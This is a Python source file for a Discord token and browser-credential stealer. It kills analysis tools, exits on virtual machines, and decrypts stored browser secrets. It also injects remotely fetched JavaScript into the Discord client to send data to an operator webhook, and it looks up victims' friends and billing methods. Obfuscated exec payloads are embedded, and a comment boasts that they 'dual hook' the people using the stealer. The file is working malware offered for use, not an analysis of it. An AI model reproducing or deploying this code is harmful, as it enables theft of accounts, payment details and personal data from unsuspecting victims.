from discord_webhook import DiscordEmbed, DiscordWebhook
import browser_cookie3
import os,psutil,threading
import subprocess
import os
import winreg
import psutil
import platform
import requests
import browser_cookie3
import getmac
import ssl
import socket
import OpenSSL
import threading
import difflib
import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from discord import Embed, File, SyncWebhook
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from tokenize import Token
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import sys
import wmi
import subprocess
import uuid
import socket
import getpass
def user_check():
        USERS = [
            "gofuckurself",

        ]

        try:
            USER = os.getlogin()
            if USER in USERS:
                os.exit(1)
        except:
            pass


def registry_check():
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
        )
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
        )
        if reg1 != 1 and reg2 != 1:
            os.exit(1)

        handle = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
        )
        try:
            reg_val = winreg.QueryValueEx(handle, "0")[0]
            if ("VMware" or "VBOX") in reg_val:
                os.exit(1)
        finally:
            winreg.CloseKey(handle)


def process_check():
        while True:
            PROCESSES = [
                "http toolkit.exe",
                "httpdebuggerui.exe",
                "wireshark.exe",
                "fiddler.exe",
                "charles.exe",
                "regedit.exe",
                "cmd.exe",
                "taskmgr.exe",
                "vboxservice.exe",
                "df5serv.exe",
                "processhacker.exe",
                "vboxtray.exe",
                "vmtoolsd.exe",
                "vmwaretray.exe",
                "ida64.exe",
                "ollydbg.exe",
                "pestudio.exe",
                "vmwareuser",
                "vgauthservice.exe",
                "vmacthlp.exe",
                "x96dbg.exe",
                "vmsrvc.exe",
                "x32dbg.exe",
                "vmusrvc.exe",
                "prl_cc.exe",
                "prl_tools.exe",
                "qemu-ga.exe",
                "joeboxcontrol.exe",
                "ksdumperclient.exe",
                "ksdumper.exe",
                "joeboxserver.exe",
                "xenservice.exe",
            ]
            for proc in psutil.process_iter():
                if any(procstr in proc.name().lower() for procstr in PROCESSES):
                    try:
                        proc.kill()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass



def hwid_check():
        HWIDS = [
            "7AB5C494-39F5-4943-9163-47F54D6D5016",
        ]

        try:
            HWID = (
                subprocess.check_output(
                    r"wmic csproduct get uuid", creationflags=0x08000000
                )
                .decode()
                .split("\n")[1]
                .strip()
            )

            if HWID in HWIDS:
                os.exit(1)
        except Exception:
            pass

def ip_check():
        try:
            IPS = [
                "None",
            ]
            IP = requests.get("https://api.myip.com").json()["ip"]

            if IP in IPS:
                os.exit(1)
        except:
            pass


def registry_check():
    reg1 = os.system(
        "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
    )
    reg2 = os.system(
        "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
    )
    if reg1 != 1 and reg2 != 1:
        os.exit(1)
    handle = winreg.OpenKey(
        winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
    )
    try:
        reg_val = winreg.QueryValueEx(handle, "0")[0]
        if ("VMware" or "VBOX") in reg_val:
            os.exit(1)
    finally:
        winreg.CloseKey(handle)
def dll_check():
    vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
    virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")
    if os.path.exists(vmware_dll):
        os.exit(1)
    if os.path.exists(virtualbox_dll):
        os.exit(1)
def specs_check():
    try:
        RAM = str(psutil.virtual_memory()[0] / 1024**3).split(".")[0]
        DISK = str(psutil.disk_usage("/")[0] / 1024**3).split(".")[0]
        if int(RAM) <= 2:
            os.exit(1)
        if int(DISK) <= 50:
            os.exit(1)
        if int(psutil.cpu_count()) <= 1:
            os.exit(1)
    except:
        pass
def proc_check():
    processes = ["VMwareService.exe", "VMwareTray.exe"]
    for proc in psutil.process_iter():
            for program in processes:
                if proc.name() == program:
                    os.exit(1)

def mac_check():
        try:
            MACS = [
                "00:03:47:63:8b:dl",
            ]
            MAC = str(getmac.get_mac_address())

            if MAC in MACS:
                os.exit(1)
        except:
            pass


hook = "YOUR WEBHOOK HERE"
inj3c710n_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
# fun fact this injection bull shit is stolen from creal so imma use therre shit. blx devs are retarded
color =  0x812118
DETECTED = False

# import random ,base64,codecs,zlib;pyobfuscate=""
# obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(private_key)'],['''sS^imon?!H%?ECuVp#R#9K_WQMGUNj_)zA8&&<dSrf?K%W@7k_40cT;0rI#qNX-<_S-4D@!9jxy7+d1Aj!l+}wGHWUPazGSB`VLi#TS@-P;9n7u5dYc=oCr8{-v_djp19BYf7Stx&}n#H<U*FVk5c$yN89JJ*UxT^@0GWS1{@nus{'''.replace('\n','')]))
# _=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='600840 10052792 2475510 107811 3460338 725070 743968 2892000 2595808 1123520 4498098 4658724 9505818 3510345 255392 146490 5557929 9774387 9643374 676195 8169140 8968656 7951905 2729216 6994785 2809039 2272480 238206 8998248 10083880 1132512 1887269 9978295 4040976 199290 720029 6381240 390456 4855272 5536608 8270336 5334956 137240 1950112 813888 1000864 14176 4719645 7434130 4414928 6253299 9947928 1058600 1230358 2126544 2411955 8232000 3136064 3545955 10065990 11478610 1845676 5793228 1659528 8606412 2662784 9252354 3826789 8515228 10136529 9876386 4503170 4636636 3050030 2304864 8648920 3476588 1063810 6624464 4304298 1150491 8042410 11245620 2352544 7278969 5070780 3834960 143016 6244008 3168128 11537244 1865133 1213344 1977057 519120 3126900 1538392 2683994 3910416 125890 1943840 169376 2568608 2306112 1493210 846355 4957785 3989836 8217104 10113987 6212658 6166328 5037850 7088140 89080 2665299 9719915 11920920 8955970 163995 576706 283176 3952332 6138720 8659980 10319940 3459800 1280676 161860 51870 2435250 6931656 3196522 1527030 341905 7265895 9809455 5280688 6588183 1684008 10751112 3620735 3711935 2101440 809948 7445910 7656305 6875824 7874685 7469960 4394725 5493528 3843530 1205130 2690707 1967374 2228611 1179175 1150372 171600 701454 4804904 669900 5363840 4755408 11124985 3124634 2961893 2837437 10306240 6771644 3092793 3541328 182988 7504380 2047000 2964060 3378704 8487488 7190998 3697158 1008513 9005208 7376139 3927743 9552368 2742597 5133926 6206652 2311680 3009798 833028 10506608 3530296 4332300 1356850 2624527 2751793 2669733 2394070 3060196 9653172 845520 3047668 1129650 1732414 1747310 6141852 3553786 8646840 10742180 287180 1469024 8047488 11999933 3563346 859220 420224 1719072 288032 236160 8018628 6755070 3157506 9098557 82624 8832714 3347765 2617768 861504 1658215 5273592 2594072 661024 902160 6018871 5059712 9333546 5543478 10761204 2640896 8903453 1575480 7633185 2561625 10578968 1218540 2351744 2321307 6116045 1633408 7015763 5559960 703580 194336 3119584 275968 733760 8284032 10978086 2905647 3348153 823648 7268835 6811105 2865536 6322155 8007685 196784 7085907 1614012 2185672 1955680 2770597 3622466 1278320 2700033 3743630 6963888 713088 5437432 1507305 2370048 8338983 4488036 4277988 9789636 9784072 5294239 4570980 2052020 2932737 873420 692064 2712832 1440256 493184 2269836 5935947 2087019 3347070 9042473 2466925 1163640 715299 5119400 61600 6803360 3070472 3586505 7106652 2033070 3448770 1332254 3203700 10746064 3431176 5216964 6666840 4895988 1158993 1447466 1891930 7078112 6234472 5222771 3231394 5588080 4378418 11000396 10886880 8793728 1153926 5624706 10051328 4147000 877546 3422952 2137083 9117108 160089 559164 5589552 1199496 4719258 5596015 6874390 2490348 1775612 1560720 4793584 715768 4420870 1858864 1768731 6089081 782892 9675759 443322 3954581 1434120 5588080 7513732 9453620 9258872 2909040 2799450 94254 10129700 9949920 11461032 497182 218660 779670 2491648 2679584 494368 352064 4780650 2815914 294496 7500159 7957680 3969000 180320 2806720 695360 4723901 2923730 6454392 9958698 3237507 9151509 4419136 548540 636352 2456512 1158016 760864 1530048 1579104 2585568 430784 2442792 6334013 8462433 5897208 1869828 4518740 3117160 5861968 1116906 2769468 816450 2827072 1415232 1191040 2284736 8500463 5873256 4862550 8653986 474048 4160392 11480880 2319080 5977776 4726700 1302857 2626355 2011353 6087816 4281612 7839 8072324 1344846 941040 376416 1535392 25216 1638144 940672 908128 1618464 2692032 10648056 9403706 9440490 4338990 8526326 10022230 3095680 5052656 1556850 3580776 899200 322624 1953120 70272 295072 4593225 1466046 1091200 6202410 2524200 3669480 7108528 2021742 3980813 775188 2749880 879060 7325537 2466936 3110290 5079795 2893968 18560 2327936 929024 2551104 2492384 250208 2255232 2757472 1236384 1442994 8935815 6523840 4058288 758816 5608275 159264 4936678 7766440 635360 3872280 3241388 98154 46120 2160368 1370625 2638555 1671604 1677458 10174381 1842902 2885703 1477056 2982847 11056675 3048096 4126658 5386576 8473294 255852 9015797 5719266 523215 5380544 7602876 3131200 3952665 5033820 6584982 3005160 3080910 7898256 1513884 2341428 858130 2530240 1594784 2112896 2613536 9160801 10402320 9666407 2264229 3761800 3583302 3224816 6873656 7062880 2358440 1934464 2074850 443128 2641596 11325900 7407946 5716016 5132800 3202520 2705549 2412399 473240 41376 1962080 2383136 2582624 116230 8708018 5645880 6635178 8949913 7043904 9106580 3237618 801350 193792 558464 1907744 2121536 7285534 6910080 4454403 7914654 3865800 9856668 3906900 1701828 590760 464890';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdK8wccz1A+IwYyBt6OheketYHmYKAFuyB3k=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
# Well look at that. you have been dual hooked! remember kids. Dont be retarded like them. ima add some obfuscated code below what will make all the tgmx prefixes to an invalid webhook incase i miss anything.
import random ,base64,codecs,zlib;py=""

pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'SyntaxError <= dir','exec':'6vRS6pecafcBd1pG03k7gq67Ph9rCQ7E5pHMyTNVsHRt9G4NAR6Huknq2egaxNwQ1mf5Ok5c8GtUiLK0','eval': bytes.fromhex('''07a357ba8431bfdd15cfc88af900d238bccf01b5427fd76ee1583ead54f623fb840bb5b5a94a9dd12c872e353b15c9025eb7172c1d04c97ddbdfa3f8f949a2982bacbe23021b858771277604f446ae44a1421078195c9085c96f444b9104ff67'''.replace("\n","")) })

_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='656740 193710 9064820 5782764 8744186 4050488 268060 315424 185760 2598176 1783520 5566752 815898 2980239 3851188 1544256 1178874 2748008 6836839 1930617 4322497 4909810 3258092 4138965 1031168 8518545 2190464 3750320 9022302 1348848 6227924 1732672 9612990 7683777 10035624 625910 6142214 6366120 8361639 9230289 5148416 10776168 1642154 909910 326016 2864512 1635200 1431456 18480 8145940 7285712 2114190 10755752 749960 1842426 3425520 6385680 1341872 2875488 9159045 2486660 8868110 4471452 7296534 6655824 4338900 2794368 11088780 5463696 8005259 9695790 4312902 668495 8201548 8967815 2520448 1505856 7459084 10949950 3077632 941136 8960400 5580452 8826480 3880215 2074304 9064649 2079440 1965040 7355628 1882026 1790976 11404540 5385498 1637088 1855548 3437040 3713220 5654304 2933622 3322804 447820 2442624 1442272 1887584 641184 6163121 8513160 2344650 6606548 3878120 1513269 653520 5848952 6612570 5980788 5638528 263440 2016704 1110720 382784 23936 772810 2189792 2388096 2202048 904896 164220 658578 2452800 6500160 10409454 7262760 493792 9250074 2196615 449080 250016 127488 2782304 719424 2179026 2123136 3341211 10180491 2957920 1327782 3289575 3237296 2380448 4252868 5475084 638976 615968 124635 9627534 11055744 6691191 2312376 261000 1195328 7700644 1427040 2407545 6058660 10610288 2832220 2639232 2258645 8702855 1121856 1626302 955680 196736 4094376 2104608 8266162 6053334 326076 7014425 7712775 36478 354409 274910 2899232 1294176 2456320 2008928 4573374 6612342 94461 7268992 2296256 8710725 8080820 301280 3161025 10634367 3206224 7063929 6056592 1776656 553216 6860109 2707305 7317860 8420269 7477470 3016316 254816 1255956 11020450 2697728 6020350 6548133 4098776 3448956 3189176 1962 1059162 1820386 5339769 1420448 918270 1812256 1145504 2834112 658336 8700804 7379280 8157897 4560787 8080247 5615297 2402360 3324321 790855 1936080 1513120 1680824 603330 4039896 2823080 2073630 1259397 2713705 1762432 573643 552965 1569240 10006650 8603397 2229980 2411416 1238688 2431560 6138839 4785784 10990090 3245700 3067326 9314452 6839760 10308340 1825426 4649790 186704 4146657 5224101 5975640 5609385 3000195 2332879 1778540 8216336 7524220 6745671 352793 7596670 3398158 9535896 3435720 8220340 2979420 332150 2904992 2250080 443872 1743680 3359476 4800996 2689346 4015282 186360 1488736 127008 422976 2124960 1264768 1335744 42496 3112448 10001775 4123248 78656 1653269 2063160 803760 869792 4044901 3030474 3477061 2826008 5382804 3217422 3023397 7400775 5613588 939330 2192416 1381408 331008 345312 884160 504736 1284224 2350240 1868128 1581024 2219968 966784 5183238 8732460 7018292 7360299 1572114 8126359 2427200 3817072 353339 2877954 144050 546144 2527552 2944672 2194016 4589137 6978120 6770016 5336234 7456960 6983432 2430374 168672 7041036 5727690 2122900 869410 443488 1223872 3057056 1186656 1440390 1645668 2746720 6881130 10115160 390200 10515792 261885 858786 1965312 2585180 1813835 2335520 3832710 8267892 9932760 10443035 8638025 1732750 36370 2228704 1935136 2803648 645696 519520 1159168 1608064 627200 954499 9298695 11042852 4719832 1957824 3176265 2676352 2712860 6702630 556600 7107460 180496 699960 208600 5854464 401115 3398367 877668 855950 7590534 3125178 3775034 970368 9573706 7799530 1593664 9437036 2503628 1405617 2487910 7689423 1120278 4374720 7156968 9018492 1974200 10150245 5143672 6068562 673920 7462659 3587924 8567180 782240 2312 6246552 922548 703192 1193696 10360695 3080264 2795513 1956751 5369952 2770416 5214003 9708762 7749960 7724106 11291735 7577658 637969 3538348 975054 228804 6842088 5786541 2241367 788566 42112 10840874 2448000 1874548 7141916 3245130 11023210 2061100 4497236 7137480 7590000 5522992 3140240 762231 932788 6444032 8290686 5045760 2893968 920450 1650824 3195680 3135072 160640 1799616 924224 2805344 1182912 212950 2985600 1822304 1150784 1731744 172095 3037050 2454496 144612 6941629 6325016 10106775 3898965 7243262 5458040 3665680 4611264 1429122 3225388 803712 2814438 3533120 3135584 1579350 5226704 2966810 1031744 602406 1787275 867735 3103000 395760 2295712 552224 1424032 546144 310144 1826528 896288 2983040 10522656 3563886 7078024 10620591 8955492 9080304 3278440 10933776 4449699 3299106 936050 2417056 1717024 2191616 1463616 802784 54496 1958784 2978944 7727384 7945665 376768 3793816 962592 5988561 1082368 9593889 749980 2723480 866640 2742588 170202 2549840 1621088 1296267 3058067 1283172 3342914 7968359 1278604 976661 2776992 5981020 3046810 1780096 5437638 4694462 6777201 2385422 6561541 5444070 1969905 8829804 9842551 944520 5390740 5174876 3625542 1309840 6868143 3529142 5323356 3983640 1548292 3508752 10201736 9047072 11132464 4147705 811420 2221549 2879220 1705312 6673392 4781103 2733710 2398632 5345028 5067130 5986134 4253838 3970216 9046267 2075980 3353328 5767338 6639408 3385786 5793200 7793852 9467700 1260493 4180700 4000610 2496075 2108050 3907792 8407912 7912800 10371560 2739040 751284 2970404 10165776 7729631 556680 6717908 2528880 3310217 948460 2888768 2990240 2780448 2779392 7774677 4250880 3841030 2937627 3843760 1047396 7826672 4573179 9607290 1026680 10742592 3286389 3580735 1231742 1426254 3803761 6774674 6261700 3737240 1403553 1033815 929420 1043264 2572352 572192 3191168 352440 6401380 11116920 2863971 5113024 4536112 4994148 2442496 492140 2282144 401568 2948608 2828992 190284 10084080 9810130 2857140 1099880 660642 3299165 9588676 1562360 1528504 36088 7991588 530352 10394160 6037385 394806 1101774 4040778 8147552 925892 10679421 4323956 9709380 10420137 8679740 1328382 3855459 10288156 1789922 1298856 6675570 6891102 5641513 615653 7667408 152944 4197600 955698 6067738 3720638 3999930 4291550 165416 1960748 9779280 11066168 1845656 1235371 3975044 11348744 4124436 9796560 9516060 114472 576970 627480 62730';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLyg3LcnQvMYxy9zF1co8yiHJ3yXIMjDIEAF9tB1Y=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')


def g371P():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def g37D474(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return g37D474(blob_out)

def D3CrYP7V41U3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04Dr3QU3575(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
            pass

def L04DUr118(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def g108411NF0():
    ip = g371P()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    g108411NF0 = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    # print(globalinfo)
    return g108411NF0


def TrU57(C00K13s):
    # simple Trust Factor system
    global DETECTED
    data = str(C00K13s)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def inj3c710n():

    username = os.getlogin()

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-1' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    inj3c710n_cont = requests.get(inj3c710n_url).text

                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", hook)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(inj3c710n_cont)
inj3c710n()


def G37UHQFr13ND5(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<a:developer:1095726251001520252> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<a:bughunter2:1095726038031548456> "},
        {"Name": 'Active_Developer', 'Value': 4194304, 'Emoji': "<a:activedev:1095725933236858991> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early:1095728685144870922> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<a:bughunter:1095725763006844948> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<a:hypesquad:1095730117327724626> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<a:partner:1095725986731004005> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<a:staff:1095725959627427861> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist 

def G3781111N6(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def G3784D63(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "developer:1095726251001520252> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<a:bughunter2:1095726038031548456> "},
        {"Name": 'Active_Developer', 'Value': 4194304, 'Emoji': "<a:activedev:1095725933236858991> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early:1095728685144870922> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<a:bughunter:1095725763006844948> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<a:hypesquad:1095730117327724626> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<a:partner:1095725986731004005> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<a:staff:1095725959627427861> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
